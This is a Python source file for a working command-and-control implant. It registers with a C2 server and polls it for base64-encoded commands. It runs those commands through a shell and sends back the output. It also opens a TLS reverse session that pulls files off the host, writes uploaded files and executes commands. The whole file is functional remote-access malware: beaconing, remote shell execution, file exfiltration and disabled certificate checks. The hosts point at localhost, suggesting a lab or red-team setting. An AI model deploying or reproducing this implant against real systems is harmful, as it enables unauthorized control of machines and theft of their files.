import requests
import time
import subprocess
import base64
import socket
import struct
from time import sleep
import os
import platform
import sys
import ssl

is_base64_enabled = True

host = "https://127.0.0.1:5000"
sessions_host = '127.0.0.1'
sessions_port = 5555
name = ""
delay = 10
os_name = platform.system()

BUFFER_SIZE = 1024 #* 4
SEPARATOR = "<SEPARATOR>"


def send_msg(sock, msg):
    # Prefix each message with a 4-byte length (network byte order)
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)

def recv_msg(sock):
    # Read message length and unpack it into an integer
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    # Read the message data
    return recvall(sock, msglen)

def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data

def sessions_shell():
    client_socket = None
    s = None

    has_socket = False
    # give a few tries to connect in case of errors
    for i in range(5):
        try:
            global sessions_port

            s = socket.socket()
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            client_socket = context.wrap_socket(s, server_hostname=sessions_host)            
            client_socket.connect((sessions_host, sessions_port))            
            has_socket = True
            break

        except Exception as ex:
            print(f"Failed on socket creation on port {sessions_port} : {ex}")
            # give some time if the server is down
            sleep(5)

    if not has_socket:
        try:
            s.close()
        except Exception:
            # s wasn't created at all so pass
            pass
        return

    has_pong = False

    for i in range(5):
        try:

            send_msg(client_socket,str.encode(name))            
            has_pong = True
            break

        except Exception as ex:
            print(f"Failed on initial connection pong: {ex}")
            # give some time if the server is down
            sleep(5)
    
    if not has_pong:
        return

    retries_counter = 0
    while True:
        try:
            # hold the connection open for some time
            client_socket.settimeout(1800.0)

            print(f"cmd before:")

            cmd_enc = recv_msg(client_socket)

            if not cmd_enc:
                print("lost connection... exiting...!")
                break

            cmd = cmd_enc.decode()
            
            print(f"cmd: {cmd}")
            

            if cmd == "" or cmd == " ":
                print("lost connection... exiting..")
                break

            if cmd == 'c2-sessions quit':
                print("c2-sessions quit")                
                break
            elif cmd == 'c2-sessions ping':
                print("c2-sessions ping")
                send_msg(client_socket,str.encode('c2-sessions pong'))

            elif 'c2-sessions download' in cmd:
                filename = " ".join(cmd.split()[2:])
                print(f"filename: {filename}")

                if not os.path.exists(filename):
                    file_size = -1
                    send_msg(client_socket, f"{file_size}{SEPARATOR}".encode())
                    continue                

                try:
                    file_size = os.path.getsize(filename)                    
                    with open(filename, 'rb') as f:
                        send_msg(client_socket, f"{file_size}{SEPARATOR}".encode())
                        bytes_sent = 0
                        while bytes_sent < file_size:
                            chunk = f.read(1024)
                            client_socket.sendall(chunk)
                            bytes_sent += len(chunk)
                except Exception as ex:
                    file_size = -1
                    send_msg(client_socket, f"{file_size}{SEPARATOR}{ex}".encode())                    

            elif 'c2-sessions upload' in cmd:
                # filename = " ".join(cmd.split()[2])
                filename = cmd.split()[2]
                print(f"filename: {filename}")
                # filesize = " ".join(cmd.split()[3])
                filesize = int(cmd.split()[3])
                print(f"filesize: {filesize}")

                # Receive the file size from the server
                # received = recv_msg(client_socket).decode()                            
                # filesize = int(received.split(SEPARATOR)[0])

                if filesize > 0:                                                                
                    try:
                        with open(filename, 'wb') as f:                            
                            send_msg(client_socket, f"GO!{SEPARATOR}".encode())
                            bytes_received = 0
                            while bytes_received < filesize:
                                chunk = client_socket.recv(1024)
                                f.write(chunk)
                                bytes_received += len(chunk)
                                    
                        print(f"[+] File {filename} received successfully")
                        send_msg(client_socket, f"OK{SEPARATOR}".encode())
                    except Exception as ex:
                        print(f'[-] Error on upload: {ex}')
                        send_msg(client_socket, f"NOT_OK{SEPARATOR}{ex}".encode())
                else:
                    print(f'[-] Error on upload: -1')
                    send_msg(client_socket, f"NOT_OK{SEPARATOR}Filesize is zero".encode())
                                 
                
            elif "c2-sessions cmd" in cmd:
                command = " ".join(cmd.split()[2:])
                print(f"command: {command}")

                if command[:2] == 'cd':
                    dir = command[3:]
                    print(f'dir: {dir}')
                    try:
                        os.chdir(dir.strip())
                        result = b""
                    except Exception as ex:
                        result = str.encode(str(ex))
                        print(f'exception on chdir: {ex}')
                
                else:
                    # timeout is used to avoid any unresponsive conditions like firing up an interactive command
                    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=15)
                    result = output.stdout + output.stderr
                    
                print("result: ",result)

                send_msg(client_socket, result)
                
        except Exception as ex:
            print(f"Exception in sessions: {ex}")
            if "timed out" in str(ex):
                print(f"timeout waiting server or command to execute ...")
                break
            elif "Transport endpoint is not connected" in str(ex):
                retries_counter += 1
                print(f"Error in sessions: {ex} Retry attempt {retries_counter}")
                
                if retries_counter > 3:
                    return
                
                sleep(3)

            else:
                continue


    if client_socket:
        try:
            client_socket.shutdown(2)
            client_socket.close()
        except Exception:
            # just continue
            pass


def register():    
    # Send a POST request to localhost/register and display the response
    url = f"{host}/register"
    data = {"type": os_name}
    response = requests.post(url, data=data, verify=False)
    print(f"Server response: {response.text}")
    return response.text

def read_run_task():    
    if name:
        url = f"{host}/tasks/{name}"
    else:
        url = f"{host}/tasks/dummyuuid"
    response = requests.get(url, verify=False)
    decoded_data = response.text
    print(f"Server sent command to execute before: {decoded_data}")
    if is_base64_enabled:
        decoded_data = base64.b64decode(response.text).decode("utf-8")    
    print(f"Server sent command to execute after: {decoded_data}")
    return decoded_data

def post_results(output):    
    print(f'output: {output}')    
    url = f"{host}/results/{name}"    
    encoded_data = output
    if is_base64_enabled:
        encoded_data = base64.b64encode(output)
    data = {"result": encoded_data}
    response = requests.post(url, data=data, verify=False)
    print(f"Server response: {response.text}")

# import urllib3
# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()
# This while is needed in case the server is down and we reach max retries
while True:
    try:
                
        name = register()
        delay = 10
        
        while True:      
            
            time.sleep(delay)

            rsp = read_run_task()            

            if not rsp:
                continue

            cmd = rsp.split()

            if cmd[0] == "c2-quit": 
                print("c2-quit... exiting...")               
                sys.exit(1)

            elif cmd[0] == "c2-sleep": 
                delay = int(cmd[1])
                print(f"c2-sleep set to {delay}")  
                post_results(f"sleep set to {delay}".encode("utf-8"))                             
                
            elif cmd[0] == "c2-register":
                name = register()                
                
            elif cmd[0] == "c2-shell":
                command = ' '.join(cmd[1:])
                result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)                
                #result = subprocess.check_output(["powershell.exe", "-Command", command])
                #result.wait()
                output = result.stdout + result.stderr
                # output = result.stdout.decode("utf-8")                
                post_results(output)           
            elif cmd[0] == "c2-session":
                try:                    
                    sessions_port = int(' '.join(cmd[1:]))
                    print(f'server_port: {sessions_port}')
                except Exception as ex:
                    sessions_port = 5555
                    print(f"Not a valid server port, defaulting to: {sessions_port}")
                    
                sessions_shell()
                #post_results(output)        
            
    except Exception as ex:
        print(f"Failed ex : {ex}")
        